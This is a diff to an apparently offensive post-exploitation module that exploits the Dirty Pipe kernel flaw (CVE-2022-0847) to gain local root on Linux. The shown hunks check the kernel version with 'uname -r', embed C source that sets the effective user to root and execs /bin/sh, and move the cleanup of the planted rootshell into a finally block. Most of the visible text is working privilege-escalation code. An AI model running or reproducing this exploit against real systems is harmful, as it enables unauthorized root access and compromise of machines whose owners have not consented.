@@ -20,7 +20,7 @@ def errcheck(result, func, args):
         print(result)
 
 class Module(BaseModule):
-    """ Exploit CVE-2022-0847 to local privesc to root via dirty pipes """
+    """ Exploit CVE-2022-0847 to local privesc to root via dirtypipe """
 
     """
     Based on original PoC at https://haxx.in/files/dirtypipez.c
@@ -58,6 +58,8 @@ class Module(BaseModule):
 
         yield Status( "checking to see if target is vulnerable to dirtypipe...")
 
+        # TODO: Check why some distros aren't using kernel release nums correctly 
+        #       (ie: Kali reports 5.16.0-kali5-amd64, but does have a ver of 5.16.14-1kali1)
         output = session.platform.run(
             "uname -r", capture_output=True, text=True, check=True
         )
@@ -72,7 +74,7 @@ class Module(BaseModule):
             yield Status( "Cannot privesc to [red]root[/red]")
             return  
 
-        session.log( f"It appears that this kernel ({kernel_version}) IS vulnerable to dirtypipe!" )
+        session.log( f"It appears that this kernel ({kernel_version}) IS potentially vulnerable to dirtypipe!" )
         
         yield Status( "preparing to privesc to [red]root[/red] via dirtypipe")
 
@@ -226,6 +228,7 @@ class Module(BaseModule):
                 """
         ).lstrip()
 
+        # TODO: Use this instead of hardcoding the elfcode array so it can work on other architectures.
         elf_code_source = textwrap.dedent(
             f"""
                 #include <stdio.h>
@@ -236,7 +239,7 @@ class Module(BaseModule):
                     seteuid(0); setegid(0);
                     execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
                 }}
-            """
+                """
         ).lstrip()
 
         current_user = session.current_user()
@@ -272,12 +275,12 @@ class Module(BaseModule):
                 session.log( "refresh_uid didn't work" )
                 yield Status( "Failed to privesc to [red]root[/red]")     
 
-            # Remove the rootshell
-            session.platform.Path(rootshell).unlink()
-
         except CalledProcessError as exc:
             session.log( "Failed privesc" )
             raise ModuleFailed(f"privesc failed: {exc}") from exc
+        finally:
+            # Remove the rootshell
+            session.platform.Path(rootshell).unlink()
         
         current_user = session.current_user()
         curr_id = current_user.id
